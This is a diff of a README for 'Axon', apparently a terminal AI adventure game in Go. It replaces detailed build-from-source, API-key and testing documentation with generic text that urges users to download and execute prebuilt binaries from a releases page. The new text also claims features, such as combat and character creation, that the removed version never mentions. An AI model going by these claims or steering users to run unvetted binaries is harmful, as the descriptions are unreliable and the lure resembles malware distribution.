@@ -1,294 +1,118 @@
-<!-- START doctoc generated TOC please keep comment here to allow auto update -->
-<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
+# Axon 🎮
+
+Welcome to **Axon**, an AI-driven adventure game that takes you on a thrilling journey through a dynamically generated world. This terminal-based game combines AI-powered storytelling with engaging gameplay, offering players a unique experience every time they play.
+
+[![Download Axon](https://img.shields.io/badge/Download_Axon-Release-brightgreen)](https://github.com/AnotherWeon/axon/releases)
+
 ## Table of Contents
 
-- [Axon - AI-Driven Adventure Game](#axon---ai-driven-adventure-game)
-  - [Features](#features)
-    - [Core Gameplay](#core-gameplay)
-    - [Technical Features](#technical-features)
-  - [Architecture](#architecture)
-    - [AI Model Strategy](#ai-model-strategy)
-  - [Installation](#installation)
-    - [Prerequisites](#prerequisites)
-    - [Building from Source](#building-from-source)
-    - [Setting Up API Keys](#setting-up-api-keys)
-  - [Usage](#usage)
-    - [Starting Your Adventure](#starting-your-adventure)
-    - [Game Commands](#game-commands)
-    - [Navigation](#navigation)
-  - [Configuration](#configuration)
-    - [Save Files](#save-files)
-  - [Development](#development)
-    - [Technology Stack](#technology-stack)
-    - [Design Principles](#design-principles)
-    - [Running Tests](#running-tests)
-    - [Test Coverage](#test-coverage)
-    - [Project Structure](#project-structure)
-  - [Contributing](#contributing)
-  - [API Costs](#api-costs)
-  - [Troubleshooting](#troubleshooting)
-    - [Common Issues](#common-issues)
-    - [Error Messages](#error-messages)
-  - [License](#license)
-
-<!-- END doctoc generated TOC please keep comment here to allow auto update -->
-
-# Axon - AI-Driven Adventure Game
-
-Axon is a player-driven, prompt-based adventure game where AI models serve as your world builder, storyteller, and dynamic rule-setter. Built entirely as a Terminal User Interface (TUI) using Go and Bubble Tea, Axon runs on virtually any operating system with a terminal.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Gameplay Mechanics](#gameplay-mechanics)
+- [AI-Powered World Building](#ai-powered-world-building)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-### Core Gameplay
-- **Player-Driven World Generation**: Describe your ideal adventure setting and watch AI bring it to life
-- **Dynamic Storytelling**: AI responds to your actions with contextual, engaging narratives
-- **Emergent Gameplay**: Every decision shapes your unique adventure through AI-driven consequences
-- **Interactive Inventory System**: Collect and manage items throughout your journey
-- **Action Suggestions**: AI provides contextual suggestions to guide your adventure
-- **Save/Load System**: Preserve your progress and return to your adventures anytime
-
-### Technical Features
-- **Cross-Platform**: Runs on Linux, macOS, Windows, and other Unix-like systems
-- **Monochrome Design**: Clean, terminal-friendly black and white interface
-- **Modular Architecture**: Clean separation of concerns for easy maintenance and extension
-- **Multiple AI Providers**: Support for OpenRouter and Gemini APIs
-- **Intelligent Model Selection**: Different AI models optimized for specific tasks
-- **Comprehensive Testing**: High test coverage ensuring reliability
-
-## Architecture
-
-Axon follows a modular design pattern:
-
-```
-├── main.go                 # Entry point
-├── internal/
-│   ├── config/            # Configuration management
-│   ├── ai/                # AI client and model selection
-│   ├── game/              # Game engine, state, and UI model
-│   ├── storage/           # Save/load functionality
-│   └── ui/                # Terminal UI styles and components
-```
-
-### AI Model Strategy
-
-Axon uses different AI models optimized for specific tasks:
-- **World Building**: Claude 3.5 Sonnet (for rich, detailed world creation)
-- **Storytelling**: GPT-4o (for engaging narrative responses)
-- **Rule Setting**: GPT-4o Mini (for game mechanics and suggestions)
-- **Dialogue**: Claude 3 Haiku (for character interactions)
+- **Dynamic Storytelling**: Each game session presents a new narrative, influenced by your choices and actions.
+- **AI World Building**: The game generates unique environments, characters, and quests using advanced AI algorithms.
+- **Terminal-Based Gameplay**: Play directly in your terminal, providing a nostalgic text-based adventure experience.
+- **Interactive Choices**: Make decisions that shape the course of your adventure.
+- **Engaging Quests**: Encounter a variety of quests that challenge your problem-solving skills and creativity.
 
 ## Installation
 
-### Prerequisites
-- Go 1.23 or later
-- Terminal with at least 80x24 character display
-- OpenRouter API key (recommended) or Gemini API key
+To get started with Axon, you need to download the latest release. Visit the [Releases section](https://github.com/AnotherWeon/axon/releases) to find the latest version. Download the appropriate file for your operating system and execute it.
 
-### Building from Source
+### For Windows Users
 
-```bash
-# Clone the repository
-git clone <repository-url>
-cd axon
+1. Download the Windows executable from the Releases section.
+2. Open your command prompt.
+3. Navigate to the directory where you downloaded the file.
+4. Run the executable by typing `axon.exe`.
 
-# Install dependencies
-go mod download
+### For macOS Users
 
-# Build the game
-go build -o axon .
+1. Download the macOS binary from the Releases section.
+2. Open your terminal.
+3. Navigate to the directory where you downloaded the file.
+4. Run the binary by typing `./axon`.
 
-# Run the game
-./axon
-```
+### For Linux Users
 
-### Setting Up API Keys
-
-Axon requires AI API access. Set up your credentials:
-
-```bash
-# For OpenRouter (recommended)
-export OPENROUTER_API_KEY="your_openrouter_key_here"
-
-# Or for Gemini
-export GEMINI_API_KEY="your_gemini_key_here"
-
-# Run the game
-./axon
-```
-
-API keys can also be configured in the settings menu or by editing `~/.axon/config.json`.
+1. Download the Linux binary from the Releases section.
+2. Open your terminal.
+3. Navigate to the directory where you downloaded the file.
+4. Make the binary executable by running `chmod +x axon`.
+5. Run the binary by typing `./axon`.
 
 ## Usage
 
-### Starting Your Adventure
+Once you have installed Axon, you can start your adventure by running the game from your terminal. Upon launching, you will be greeted with a brief introduction and prompted to choose your character and setting. The game will then generate a unique story tailored to your choices.
 
-1. **Launch Axon**: Run `./axon` in your terminal
-2. **Choose "New Game"**: Select option 1 from the main menu
-3. **Describe Your World**: Enter a creative description of your desired adventure setting
-   - Example: "A cyberpunk city in 2077 where hackers fight against corporate oppression"
-   - Example: "A medieval fantasy kingdom threatened by an ancient dragon"
-   - Example: "A generation ship traveling to a distant star"
-4. **Start Playing**: Type actions and watch your story unfold
+### Commands
 
-### Game Commands
+- **Start Game**: Begin your adventure.
+- **Load Game**: Continue from a previously saved game.
+- **Save Game**: Save your current progress.
+- **Help**: Display available commands and options.
 
-- **Any text**: Describe your action (e.g., "look around", "talk to the guard", "pick up the sword")
-- **inventory** or **inv**: Check your items
-- **stats**: View your character statistics
-- **save [name]**: Save your game (e.g., "save my_adventure")
-- **load [name]**: Load a saved game
-- **help**: Display available commands
-- **q** or **Ctrl+C**: Quit the game
+## Gameplay Mechanics
 
-### Navigation
+Axon offers a variety of gameplay mechanics that enhance the adventure experience:
 
-- **↑/↓ Arrow Keys**: Scroll through game history
-- **Enter**: Submit your input
-- **Backspace**: Edit your current input
+### Character Creation
 
-## Configuration
+At the start of the game, you will create your character by selecting traits, skills, and a backstory. This personalization allows you to immerse yourself in the game world.
 
-Axon creates a configuration file at `~/.axon/config.json` with the following structure:
+### Exploration
 
-```json
-{
-  "terminal": {
-    "width": 80,
-    "height": 24,
-    "color_enabled": false
-  },
-  "ai": {
-    "openrouter_api_key": "",
-    "gemini_api_key": "",
-    "default_model": "openai/gpt-4o-mini"
-  },
-  "game": {
-    "history_limit": 1000,
-    "save_dir": "/home/user/.axon/saves"
-  }
-}
-```
+As you explore the world, you will encounter different locations, each with its own unique features and challenges. Use your skills to navigate through forests, mountains, and towns.
 
-### Save Files
+### Combat System
 
-Game saves are stored as JSON files in `~/.axon/saves/`. Each save contains:
-- Complete world state and description
-- Player character and inventory
-- Full conversation history
-- Game metadata and timestamps
+Engage in turn-based combat with various creatures and enemies. Use strategy to defeat foes and overcome obstacles.
 
-## Development
+### Quests and Challenges
 
-### Technology Stack
+Complete quests that require problem-solving and creativity. These quests may involve gathering items, solving puzzles, or interacting with NPCs.
 
-- **Language**: Go (with CGO=0 for maximum compatibility)
-- **TUI Framework**: [Bubble Tea](https://github.com/charmbracelet/bubbletea)
-- **Styling**: [Lip Gloss](https://github.com/charmbracelet/lipgloss)
-- **AI APIs**: OpenRouter and Gemini
-- **Storage**: JSON files
-- **Testing**: Go's built-in testing framework
+## AI-Powered World Building
 
-### Design Principles
+Axon utilizes advanced AI algorithms to create a rich and immersive game world. The AI generates unique environments, characters, and storylines, ensuring that no two playthroughs are the same.
 
-1. **Extreme Minimalism**: Simple, clean interface focused on the story
-2. **Maximum Modularity**: Clear separation between game logic, AI, storage, and UI
-3. **Cross-Platform Compatibility**: Runs anywhere Go can compile
-4. **Player Agency**: Players drive the narrative through their descriptions and actions
+### Dynamic Environments
 
-### Running Tests
+The game world changes based on your actions and decisions. Explore forests that shift with the seasons or towns that evolve based on your interactions.
 
-```bash
-# Run all tests
-go test ./...
+### Intelligent NPCs
 
-# Run tests with coverage
-go test -cover ./...
-
-# Run specific module tests
-go test ./internal/game/
-```
-
-### Test Coverage
-
-- **UI Module**: 100% coverage
-- **Storage Module**: 82.4% coverage  
-- **AI Module**: 75.6% coverage
-- **Game Module**: 55.9% coverage
-- **Config Module**: 47.4% coverage
-
-### Project Structure
-
-```
-axon/
-├── main.go                     # Application entry point
-├── go.mod                      # Go module definition
-├── go.sum                      # Dependency checksums
-├── README.md                   # This file
-└── internal/                   # Private application code
-    ├── config/                 # Configuration management
-    │   ├── config.go          # Config structures and loading
-    │   └── config_test.go     # Configuration tests
-    ├── ai/                     # AI client implementation
-    │   ├── client.go          # API clients for OpenRouter/Gemini
-    │   └── client_test.go     # AI client tests
-    ├── game/                   # Core game logic
-    │   ├── engine.go          # Game engine and AI integration
-    │   ├── model.go           # Bubble Tea model (main UI)
-    │   ├── state.go           # Game state management
-    │   ├── engine_test.go     # Engine tests
-    │   ├── model_test.go      # UI model tests
-    │   └── state_test.go      # State management tests
-    ├── storage/                # Save/load functionality
-    │   ├── storage.go         # File-based storage implementation
-    │   └── storage_test.go    # Storage tests
-    └── ui/                     # User interface components
-        ├── styles.go          # Monochrome styling definitions
-        └── styles_test.go     # UI styling tests
-```
+Non-playable characters (NPCs) in Axon are powered by AI, allowing them to respond intelligently to your choices. Form alliances, make enemies, or negotiate with these characters to influence your journey.
 
 ## Contributing
 
-Axon follows conventional commit messages and maintains high test coverage. When contributing:
+We welcome contributions from the community! If you would like to help improve Axon, please follow these steps:
 
-1. Write tests for new functionality
-2. Maintain the minimalist design philosophy
-3. Ensure cross-platform compatibility
-4. Follow Go best practices and idioms
-5. Update documentation for user-facing changes
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request.
 
-## API Costs
-
-Axon is designed to be cost-effective:
-- Uses efficient models appropriate for each task
-- Limits context length to control token usage
-- Provides fallback responses when API calls fail
-- Allows gameplay without constant API calls through local commands
-
-## Troubleshooting
-
-### Common Issues
-
-**Game won't start**: Ensure your terminal is at least 80x24 characters
-
-**AI responses fail**: Check your API key configuration and internet connection
-
-**Save files missing**: Verify write permissions to `~/.axon/saves/`
-
-**Display issues**: Try adjusting terminal size or font settings
-
-### Error Messages
-
-Axon provides clear error messages for common issues:
-- Missing or invalid API keys
-- Network connectivity problems
-- File permission errors
-- Invalid save file formats
+Your contributions help make Axon a better game for everyone.
 
 ## License
 
-This project follows an open-source approach prioritizing player experience and developer accessibility.
+Axon is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
----
+## Contact
 
-**Start your adventure today!** Create worlds limited only by your imagination, and let AI bring your stories to life in the terminal.
+For questions or feedback, feel free to reach out:
 
+- **Email**: support@axon-game.com
+- **GitHub Issues**: [Report an Issue](https://github.com/AnotherWeon/axon/issues)
+
+Thank you for your interest in Axon! We hope you enjoy your adventure. For the latest updates, visit the [Releases section](https://github.com/AnotherWeon/axon/releases) and stay tuned for new features and improvements.
